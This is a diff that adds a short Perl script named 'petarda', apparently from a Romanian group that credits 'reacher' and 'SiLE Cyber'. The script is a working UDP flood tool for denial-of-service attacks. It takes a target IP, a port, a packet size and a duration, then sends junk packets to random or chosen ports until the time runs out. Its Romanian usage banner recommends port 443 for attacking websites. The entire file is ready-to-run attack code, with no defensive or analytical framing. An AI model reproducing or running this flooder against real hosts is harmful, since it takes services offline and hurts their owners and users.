@@ -1,0 +1,29 @@
+use Socket;
+use strict;
+
+if ($#ARGV != 3) {
+  print "\n\t\t\t##########################################\n";
+  print "\n\t\t\t# perl petarda 1.2.3.4 [443/500] 65500 0 #\n";
+  print "\n\t\t\t# 500 = port pentru IP-uri normale       #\n";
+  print "\n\t\t\t# 443 = port pentru website-uri          #\n";
+  print "\n\t\t\t##########################################\n";
+  exit(1);
+}
+
+my ($ip,$port,$size,$time) = @ARGV;
+my ($iaddr,$endtime,$psize,$pport);
+$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
+$endtime = time() + ($time ? $time : 1000000);
+socket(flood, PF_INET, SOCK_DGRAM, 17);
+
+printf "[0;32m###########################################\n";
+printf "[0;31m# Se trimit petardele spre IP.            #\n";
+printf "[0;32m###########################################\n";
+printf "[0;32m# uam by reacher and design by SiLE Cyber #\n";
+printf "[0;32m###########################################\n";
+
+for (;time() <= $endtime;) {
+  $psize = $size ? $size : int(rand(1500-64)+64) ;
+  $pport = $port ? $port : int(rand(65500))+1;
+
+  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));} 
